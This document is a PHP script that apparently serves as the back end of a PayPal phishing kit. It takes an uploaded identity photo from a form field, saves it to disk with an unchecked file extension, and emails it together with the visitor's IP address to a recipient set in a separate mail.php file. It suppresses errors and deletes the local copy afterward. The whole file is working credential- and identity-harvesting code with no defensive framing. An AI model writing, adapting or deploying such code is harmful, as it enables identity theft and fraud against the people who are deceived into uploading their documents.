<?php
error_reporting(0);
ini_set('display_errors', 0);
function base64_to_jpeg($base64_string, $FileName) {
	//Get Image Type
	preg_match("/^data:(.*);base64/",$base64_string, $match);
	$type = explode("/",$match[1]);
	$imagesave = "$FileName.".$type[1];
    // open the output file for writing
    $ifp = fopen( $imagesave, 'wb' );

    // split the string on commas
    // $data[ 0 ] == "data:image/png;base64"
    // $data[ 1 ] == <actual base64 string>
    $data = explode( ',', $base64_string );

    // we could add validation here with ensuring count( $data ) > 1
    fwrite( $ifp, base64_decode( $data[ 1 ] ) );

    // clean up the file resource
    fclose( $ifp );

    return $imagesave;
}

$x =  $_POST['xx'];
include("mail.php");
$subject = "PPL ID Confirm Form : ".getenv("REMOTE_ADDR");
$headers = "From: $from\r\n";
$headers .= "MIME-Version: 1.0\r\n"
  ."Content-Type: multipart/mixed; boundary=\"1a2a3a\"";

$message .= "If you can see this MIME than your client doesn't accept MIME types!\r\n"
  ."--1a2a3a\r\n";

$message .= "Content-Type: text/html; charset=\"iso-8859-1\"\r\n"
  ."Content-Transfer-Encoding: 7bit\r\n\r\n"
  ."<p>PayPal identity\r\n"
  ."--1a2a3a\r\n";

$file = file_get_contents(base64_to_jpeg($x,"pplid"));

$message .= "Content-Type: image/jpg; name=\"picture.jpg\"\r\n"
  ."Content-Transfer-Encoding: base64\r\n"
  ."Content-disposition: attachment; file=\"picture.jpg\"\r\n"
  ."\r\n"
  .chunk_split(base64_encode($file))
  ."--1a2a3a--";

// Send email

$success = mail($to,$subject,$message,$headers);// localhost -_-
if (!$success) {
	echo "ERROR";
    unlink(base64_to_jpeg($x,"pplid"));
}else {
	echo "Done" ;
	unlink(base64_to_jpeg($x,"pplid"));
}
?>